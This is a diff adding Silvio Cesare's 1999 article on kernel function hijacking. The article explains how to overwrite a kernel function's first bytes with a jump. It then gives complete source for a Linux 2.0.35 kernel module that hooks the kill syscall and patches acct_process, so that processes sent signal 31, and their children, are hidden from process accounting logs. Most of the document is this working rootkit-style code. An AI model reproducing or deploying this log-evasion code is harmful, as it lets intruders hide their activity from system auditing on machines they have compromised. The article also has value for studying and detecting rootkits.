@@ -1,0 +1,164 @@
+KERNEL FUNCTION HIJACKING
+
+	- Silvio Cesare <silvio@big.net.au>
+	- November 1999
+
+INTRODUCTION
+
+This article describes a method of hijacking internal kernel functions, that
+is, kernel functions that are declared inside the kernel without a function
+pointer or vector for changing the kernel function it points too.  This can
+have practical uses, as given in example code which patches the process
+accounting code to not log specially marked processes (processes given signal
+31).
+
+KERNEL FUNCTION HIJACKING
+
+The basic premise for this attack is to replace the first bytes of the original
+function with an asm jump to the replacement jump.  The algorithm follows
+
+In init_module...
+
+	* save the first 7 bytes of the original function for later use
+	* set the new jump code to point to the replacement function
+	* replace the first 7 bytes of the original function with a jump
+
+In cleanup_module...
+
+	* restore the bytes of the original function with the saved copy
+
+In the replacement function...
+
+	* do the payload
+	  for calling the old function...
+		* restore the bytes of the original function with the saved
+		  copy
+		* call the original function
+		* replace the first 7 bytes of the original function with a
+		  jump				  
+
+The asm jump used is an indirect jump...  This means no messing around with
+calculating offsets.
+
+	movl $address_to_jump,%eax
+	jmp *%eax
+
+THE IMPLEMENTED EXAMPLE
+
+The example code patches acct_process in kernel/sys.c which accounts for
+process accounting.  Normally, you cannot redirect acct_process, but this does
+all the logging for process accounting, so we hijack the function to control
+process logging.
+
+The code works by waiting for a kill -31 to a process, when this is recieved,
+the replacement kill syscall sets a bit in the process flags that marks the
+process as not to be logged by process accounting.  This technique is ideal
+as when the process forks, the process flags are copied, so children remaing
+log free aswell.  The heart of the code is in _acct_process which looks at the
+process flags and if marked not to be logged, returns without calling the
+original acct_process.
+
+The acct_process variable must be assigned the correct address of the function
+in the kernel.  Typically, this is found in System.map but if no map is present
+then the techniques described in my paper RUNTIME KERNEL KMEM PATCHING 
+(http://www.big.net.au/~silvio) may be used.
+
+
+-- acct_nolog.c (Linux 2.0.35)
+
+#include <linux/config.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/utsname.h>
+#include <linux/string.h>
+#include <linux/sched.h>
+#include <asm/string.h>
+#include <asm/unistd.h>
+
+/*
+	change this to the correct address, which can be found in System.map
+*/
+
+int (*acct_process)(int) = (int (*)(int))0x00114520;
+
+#define CODESIZE	7
+
+#define NOLOG_SIGNAL	31
+#define NOLOG_PF	0x10000000
+
+static char original_acct_code[7];
+static char acct_code[7] =
+	"\xb8\x00\x00\x00\x00"	/*	movl   $0,%eax	*/
+	"\xff\xe0"		/*	jmp    *%eax	*/
+;
+int (*original_kill)(pid_t, int);
+
+extern void *sys_call_table[];
+
+void *_memcpy(void *dest, const void *src, int size)
+{
+	const char *p = src;
+	char *q = dest;
+	int i;
+
+	for (i = 0; i < size; i++) *q++ = *p++;
+
+	return dest;
+}
+
+int _acct_process(long exitcode)
+{
+	if (!(current->flags & NOLOG_PF)) {
+		int ret;
+
+		_memcpy(acct_process, original_acct_code, CODESIZE);
+		ret = acct_process(exitcode);
+		_memcpy(acct_process, acct_code, CODESIZE);
+		return ret;
+	}
+	return 0;
+}
+
+struct task_struct *find_task(pid_t pid)
+{
+	struct task_struct *task = current;
+
+	do {
+		if (task->pid == pid) return task;
+		task = task->next_task;
+	} while (task != current);
+
+	return NULL;
+}
+
+
+int _kill(pid_t pid, int sig)
+{
+	if (sig == NOLOG_SIGNAL) {
+		struct task_struct *task;
+
+		task = find_task(pid);
+		if (task == NULL) return - ESRCH;
+
+		task->flags |= NOLOG_PF;
+		return 0;
+	}
+	return original_kill(pid, sig);
+}
+
+int init_module(void)
+{
+	original_kill = sys_call_table[__NR_kill];
+	sys_call_table[__NR_kill] = _kill;
+	*(long *)&acct_code[1] = (long)_acct_process;
+	_memcpy(original_acct_code, acct_process, CODESIZE);
+	_memcpy(acct_process, acct_code, CODESIZE);
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	sys_call_table[__NR_kill] = original_kill;
+	_memcpy(acct_process, original_acct_code, CODESIZE);
+}
